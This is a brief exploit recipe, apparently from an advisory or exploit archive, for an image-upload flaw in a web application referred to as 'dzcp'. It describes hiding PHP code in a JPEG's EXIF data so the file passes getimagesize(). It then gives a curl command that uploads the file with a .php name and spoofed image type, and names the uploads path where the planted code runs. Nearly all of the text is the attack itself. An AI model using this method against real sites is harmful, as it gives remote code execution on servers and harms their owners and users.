=================================&#039;
Get a JPEG file, open it in a hex editor, add some PHP inside the EXIF data or
in similar places.  Make sure PHP&#039;s getimagesize() does not return false and
that the file does not throw parse errors or the like when fed to PHP.  Then:

curl -F &#039;file=@img.php;type=image/jpeg&#039; &#039;http://<dzcp>/upload/index.php?action=userpic&do=upload&#039;

Then check http://<dzcp>/inc/images/uploads/userpics/.php
